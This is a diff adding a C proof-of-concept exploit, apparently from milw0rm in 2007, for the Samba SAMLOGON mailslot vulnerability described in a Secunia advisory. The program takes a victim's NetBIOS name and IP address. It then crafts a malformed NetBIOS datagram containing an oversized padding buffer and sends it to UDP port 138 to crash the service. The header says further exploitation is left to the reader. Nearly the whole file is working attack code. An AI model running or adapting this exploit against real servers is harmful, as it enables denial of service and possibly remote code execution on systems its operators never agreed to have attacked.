@@ -1,0 +1,229 @@
+/* http://secunia.com/secunia_research/2007-99/advisory/
+ *
+ * A remote attacker could send a specially crafted "SAMLOGON" domain
+ * logon packet, possibly leading to the execution of arbitrary code with
+ * elevated privileges. Note that this vulnerability is exploitable only
+ * when domain logon support is enabled in Samba.
+ *
+ * ///////
+ *
+ * Sample/simple POC [crash only] by a bored guy at asmx86 gmail [com], further exploitation or not.. is left as an exercise to the reader.
+ *
+ * laneleb & petemir, a true love in this world! hi!
+ *
+ * kangaroo kangaroo...
+ */
+
+#include <sys/types.h>
+#include <sys/socket.h>  
+#include <netdb.h>  
+#include <netinet/in.h>  
+#include <arpa/inet.h>  
+#include <stdio.h>  
+#include <stdlib.h>  
+#include <string.h>  
+#include <unistd.h>  
+#include <assert.h>
+#include <stdint.h>
+
+/* smb ripped defines/etc */
+
+#define MAX_DGRAM_SIZE 576
+#define MAX_NETBIOSNAME_LEN 16
+typedef char nstring[MAX_NETBIOSNAME_LEN];
+typedef char unstring[MAX_NETBIOSNAME_LEN*4];
+enum node_type {B_NODE=0, P_NODE=1, M_NODE=2, NBDD_NODE=3};
+
+#define PTR_DIFF(p1,p2) (/*(ptrdiff_t)*/(((const char *)(p1)) - (const char *)(p2)))
+
+#define CVAL_NC(buf,pos) (((unsigned char *)(buf))[pos]) /* Non-const version of CVAL */
+#define SSVALX(buf,pos,val) (CVAL_NC(buf,pos)=(unsigned char)((val)&0xFF),CVAL_NC(buf,pos+1)=(unsigned char)((val)>>8))
+
+#define SSVAL(buf,pos,val) SSVALX((buf),(pos),((uint16_t)(val)))
+#define SCVAL(buf,pos,val) (CVAL_NC(buf,pos) = (val))
+
+/* A netbios name structure. */
+struct nmb_name {
+	nstring      name;
+	char         scope[64];
+	unsigned int name_type;
+};
+
+void safe_strcpy(char *a, char *b, uint32_t size)
+{
+    strcpy(b, a);
+}
+
+void put_name(char *dest, const char *name, int pad, unsigned int name_type)
+{
+    size_t len = strlen(name);
+
+    memcpy(dest, name, (len < MAX_NETBIOSNAME_LEN) ? len : MAX_NETBIOSNAME_LEN - 1);
+    if (len < MAX_NETBIOSNAME_LEN - 1)
+    {
+        memset(dest + len, pad, MAX_NETBIOSNAME_LEN - 1 - len);
+    }
+
+    dest[MAX_NETBIOSNAME_LEN - 1] = name_type;
+}
+
+int put_nmb_name(char *buf,int offset,struct nmb_name *name)
+{
+    int ret,m;
+    nstring buf1;
+    char *p;
+
+    if (strcmp(name->name,"*") == 0)
+    {
+        /* special case for wildcard name */
+        put_name(buf1, "*", '\0', name->name_type);
+    }
+    else
+    {
+        put_name(buf1, name->name, ' ', name->name_type);
+    }
+
+    buf[offset] = 0x20;
+
+    ret = 34;
+
+    for (m=0;m<MAX_NETBIOSNAME_LEN;m++)
+    {
+        buf[offset+1+2*m] = 'A' + ((buf1[m]>>4)&0xF);
+        buf[offset+2+2*m] = 'A' + (buf1[m]&0xF);
+    }
+    offset += 33;
+
+    buf[offset] = 0;
+
+    if (name->scope[0])
+    {
+        /* XXXX this scope handling needs testing */
+        ret += strlen(name->scope) + 1;
+        safe_strcpy(&buf[offset+1],name->scope,sizeof(name->scope));
+
+        p = &buf[offset+1];
+        while ((p = strchr(p,'.')))
+        {
+            buf[offset] = PTR_DIFF(p,&buf[offset+1]);
+            offset += (buf[offset] + 1);
+            p = &buf[offset+1];
+        }
+        buf[offset] = strlen(&buf[offset+1]);
+    }
+
+    return(ret);
+}
+
+typedef struct exudp_s
+{
+    unsigned char msg_type;
+    unsigned char flags;
+    uint16_t dgm_id;
+    uint32_t source_ip;
+    uint16_t source_port;
+    uint16_t dgm_len;
+    uint16_t pOffset;
+    struct nmb_name source_name;
+    struct nmb_name dest_name;
+} exudp;
+
+/* code */
+
+int send_udp(int ip, char *packet, unsigned int packetSize)
+{
+    int fd;
+    struct sockaddr_in to;
+    int len;
+
+    if( (fd = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
+        return 0;
+
+    to.sin_family      = AF_INET;
+    to.sin_addr.s_addr = ip;
+    to.sin_port        = htons(138);
+
+    if( (len = sendto(fd, packet, packetSize, 0, (struct sockaddr *)&to, sizeof(struct sockaddr_in))) < 0)
+    {
+        perror("sendto");
+        return 0;
+    }
+
+    return len;
+}
+
+int main(int argc, char *argv[])
+{
+    unsigned char samlogon[10240];
+    unsigned int  nlOffset;
+    exudp dgPacket;
+
+    printf("smb_mailslot() POC by asmx86@gmail.com\n\n");
+
+    if(argc < 3)
+    {
+        printf("Usage: %s <uppercase victim's netbios name> <victim's ip>\n\n", argv[0]);
+        exit(1);
+    }
+
+    if(strlen(argv[1]) > 15)
+    {
+        printf("[!] netbios victim's name too long\n");
+        exit(1);
+    }
+
+    memset(samlogon, 0, sizeof(samlogon));
+
+    dgPacket.msg_type    = 0x11;
+    dgPacket.flags       = 1;
+    dgPacket.dgm_id      = 0xdead;
+    dgPacket.source_ip   = 0xdeadbeef;
+    dgPacket.source_port = 0xc0fe;
+    dgPacket.dgm_len     = 0;
+    dgPacket.pOffset     = 0;
+
+    strcpy(dgPacket.source_name.name, "ASMX86@GMAILCOM");
+    strcpy(dgPacket.dest_name.name, argv[1]);
+
+    nlOffset = 14;
+
+    nlOffset += put_nmb_name((char *)&samlogon, nlOffset, &dgPacket.source_name);
+    nlOffset += put_nmb_name((char *)&samlogon, nlOffset, &dgPacket.dest_name);
+
+#define OFFSET 97
+
+    nlOffset -= 4;
+    SCVAL(samlogon, nlOffset+4, 0);
+    SSVAL(samlogon, nlOffset+4+OFFSET, 18);
+    SCVAL(samlogon, nlOffset+7, 0);
+    SCVAL(samlogon, nlOffset+8, 0x25);
+    SSVAL(samlogon, nlOffset+59, 397);
+
+    SSVAL(samlogon, nlOffset+61, OFFSET);
+
+    SSVAL(samlogon, nlOffset+63, 0);
+
+    SSVAL(samlogon, nlOffset+36, 12);
+    memcpy(&samlogon[nlOffset+39+(12*2)], "\\MAILSLOT\\NET\\NTLOGON", 21);
+
+    memcpy(&samlogon[nlOffset+4+OFFSET+4],     "\x41\x00\x41\x00\x00\x00", 6);
+    memcpy(&samlogon[nlOffset+4+OFFSET+4+6-1], "\x42\x00\x42\x00\x00\x00", 6);
+    memset(&samlogon[nlOffset+4+OFFSET+4+6+6], '\x43', 260);                   //play with this value ;)
+
+    nlOffset = 576;
+
+    dgPacket.dgm_len = nlOffset - 14;
+    dgPacket.dgm_len = htons(dgPacket.dgm_len);
+
+    memcpy(&samlogon, &dgPacket, 14);
+
+    if(!send_udp(inet_addr(argv[2]), samlogon, nlOffset))
+        fprintf(stderr, "[!] Error sending UDP packet\n");
+    else
+        fprintf(stderr, "[*] packet sent\n");
+
+    return 0;
+}
+//eof
+
+// milw0rm.com [2007-12-14]
